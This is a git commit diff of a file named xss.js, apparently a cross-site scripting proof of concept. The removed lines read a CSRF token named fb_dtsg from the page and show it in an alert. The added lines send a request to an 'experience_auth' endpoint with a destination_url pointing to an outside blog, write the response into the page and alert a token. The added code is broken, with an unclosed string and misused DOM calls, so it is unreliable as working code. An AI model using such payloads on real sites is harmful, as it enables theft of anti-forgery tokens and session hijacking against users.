fc2c87cddaa23f4940ea080a588fc397c5a08ad5
Martatha Kamil <30318299+A0x01@users.noreply.github.com>
2020-11-10 22:53:57 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,2 +1,13 @@
-var token = document.getElementsByTagName("input")['token'].value;
-alert('Your CSRF protection token fb_dtsg has value '+token);
+    <script>
+        var request = new XMLHttpRequest();    
+        request.onreadystatechange = function() {
+            if (request.readyState == 4 && request.status == 200) {
+                document.getElementById("result").innerHTML = request.responseText;
+            }
+        };
+        var token = document.getElementsByTagName("token").innerHTML;
+        request.open("GET", "widgets/experience_auth?destination_url=http://alaa.blog, true);
+        request.send();
+		alert('Your token is  '+token);
+
+    </script>
